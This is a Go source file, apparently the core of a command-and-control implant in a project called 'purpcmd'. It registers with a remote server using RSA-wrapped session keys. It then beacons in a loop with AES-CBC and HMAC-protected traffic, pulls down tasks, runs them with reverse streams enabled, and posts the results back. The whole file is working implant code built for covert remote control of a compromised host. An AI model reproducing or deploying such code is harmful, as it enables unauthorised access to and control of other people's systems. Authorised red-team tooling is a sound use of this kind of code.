package core

import (
	"bytes"
	"encoding/base64"
	"io"
	"time"

	"purpcmd/internal/encrypt"
)

// SetPublicKeyDER configures the RSA public key embedded by a payload builder.
// Keeping this entry point in the public core package allows generated sources
// outside the repository, such as /tmp build workspaces, to respect Go's
// internal-package import rules.
func SetPublicKeyDER(der []byte) error {
	return encrypt.SetGlobalPublicKeyDER(der)
}

func Start(sock string, payloadTypes ...string) {
	i := ImplantInit(payloadTypes...)

	h := HTTPNew(i.SessionID)
	h.HTTPSetSocket(sock)
	h.HTTPSetURL(false, "/")

	enc := encrypt.EncryptInit()
	key, iv := enc.EncryptGetKeys()

	r := PackRegistration(i, key, iv)
	aux, err := enc.RSAEncode(r)
	if err != nil {
		println(err.Error())
		return
	}

	p := base64.StdEncoding.EncodeToString(aux)
	if err := h.PostRegistering([]byte(p)); err != nil {
		println(err.Error())
		return
	}

	for {
		data := PackCheck(i)
		dataEnc := enc.AESCbcEncrypt(data)

		enc.HMACPackAddHmac(&dataEnc)
		dataP := base64.StdEncoding.EncodeToString(dataEnc)

		resp, err := h.Get([]byte(dataP))
		if err != nil {
			println(err.Error())
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}

		xyz, readErr := io.ReadAll(resp)
		_ = resp.Close()
		if readErr != nil {
			println(readErr.Error())
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}
		if len(xyz) < 16 {
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}
		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(xyz)))
		n, _ := base64.StdEncoding.Decode(dataB64, xyz)

		if !enc.HMACVerifyHash(dataB64[:n]) {
			println("data not verified properly")
			return
		}
		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
		xyzDecry, err := enc.AESCbcDecrypt(dataOrig)
		if err != nil {
			println(err.Error())
			return
		}

		tid, tcode, payload, err := PackParseTaskChecked(bytes.NewReader(xyzDecry))
		if err != nil {
			println("invalid task frame:", err.Error())
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}

		// Create command context for handlers
		ctx := &CommandContext{
			Implant:             i,
			Encrypt:             &enc,
			HTTP:                h,
			AllowReverseStreams: true,
		}

		response, terminate, executeErr := ExecuteTask(ctx, tcode, payload, tid)
		if response != "" {
			if postErr := h.Post([]byte(response)); postErr != nil {
				println(postErr.Error())
			}
		}
		if executeErr != nil {
			println(executeErr.Error())
		}
		if terminate {
			HandleKill()
		}

		time.Sleep(time.Duration(i.Sleep) * time.Second)
	}
}
